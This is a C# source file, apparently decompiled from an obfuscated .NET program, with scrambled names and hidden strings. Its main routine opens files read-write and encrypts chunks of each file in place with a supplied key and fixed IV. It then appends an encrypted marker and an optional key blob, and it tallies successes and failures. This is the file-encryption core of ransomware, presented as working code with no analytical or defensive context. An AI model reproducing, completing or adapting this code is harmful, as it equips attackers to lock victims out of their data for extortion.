using System;
using System.IO;
using System.Text;
using CRPNLqUwoxImGM;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace GfIOnzejDqtqB;

internal sealed class HwwjjyTVGSTU
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int ozrChSZLtAP(long long_0)
	{
		return (int)long_0;
	}

	public static bool iffTJBxzbDtUl(string KNHzwvgpdJ, string aGZVbjWxpo, string lqnCxECfZwGj, byte[] FGeIxAeSZrKu = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(KNHzwvgpdJ, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = ozrChSZLtAP(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(aGZVbjWxpo) * Convert.ToInt32(fileStream.Length) / 100;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = int.MaxValue;
				}
				if (num < num2)
				{
					num2 = num - Convert.ToInt32(aGZVbjWxpo) * 1000 * 1000;
				}
				int ydAvOkuLdX = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 2; i++)
				{
					byte[] byte_ = iTXMmXqIlwrg(KNHzwvgpdJ, fileStream, ydAvOkuLdX, num * i);
					array = (XpwFCiWTIXog.jUTdQQEeFeYZhnmcv ? VoJDuYIUixwR.DIjMZWEAFCxXcE(byte_, Encoding.ASCII.GetBytes(lqnCxECfZwGj), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : YuMGwWVrDuXKA.NzljVXFBjDaHS(byte_, Encoding.ASCII.GetBytes(lqnCxECfZwGj), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					mczIHrMuMDop(KNHzwvgpdJ, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (XpwFCiWTIXog.fpnZuwWWrCf ? Encoding.ASCII.GetBytes(XpwFCiWTIXog.pimTPtzgsj(getString_0(107403070)) + XpwFCiWTIXog.pimTPtzgsj(getString_0(107404054)) + Convert.ToString(aGZVbjWxpo) + XpwFCiWTIXog.pimTPtzgsj(getString_0(107404054))) : Encoding.ASCII.GetBytes(XpwFCiWTIXog.pimTPtzgsj(getString_0(107403070)) + XpwFCiWTIXog.pimTPtzgsj(getString_0(107404063)) + Convert.ToString(aGZVbjWxpo) + XpwFCiWTIXog.pimTPtzgsj(getString_0(107404063))));
			if (!XpwFCiWTIXog.fpnZuwWWrCf)
			{
				using FileStream fileStream2 = new FileStream(KNHzwvgpdJ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(KNHzwvgpdJ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(FGeIxAeSZrKu, 0, FGeIxAeSZrKu.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (XpwFCiWTIXog.AreaxgrYTj)
			{
				try
				{
					File.AppendAllText(XpwFCiWTIXog.RqqYTsMuxEQen, getString_0(107389961) + KNHzwvgpdJ + getString_0(107403025) + ex.Message + getString_0(107397211));
				}
				catch (Exception)
				{
				}
			}
			XpwFCiWTIXog.MtUrEdDRDzL++;
			return false;
		}
		XpwFCiWTIXog.YIvQxgIKBLMzUZ++;
		return true;
	}

	public static byte[] iTXMmXqIlwrg(string RMWJTmpjJPhFn, FileStream zXEiwFtDyHXJ, int YdAvOkuLdX, int TROPWIaKecbUSsuxa = 0)
	{
		byte[] array = new byte[YdAvOkuLdX];
		zXEiwFtDyHXJ.Position = TROPWIaKecbUSsuxa;
		zXEiwFtDyHXJ.Read(array, 0, YdAvOkuLdX);
		return array;
	}

	public static void mczIHrMuMDop(string MSfvVffThSeV, FileStream cnLmlMfNsIEv, byte[] LnOKcgcmxOX, int DJgCqXtFYaPOM = 0)
	{
		cnLmlMfNsIEv.Position = DJgCqXtFYaPOM;
		cnLmlMfNsIEv.Write(LnOKcgcmxOX, 0, LnOKcgcmxOX.Length);
	}

	static HwwjjyTVGSTU()
	{
		Strings.CreateGetStringDelegate(typeof(HwwjjyTVGSTU));
	}
}
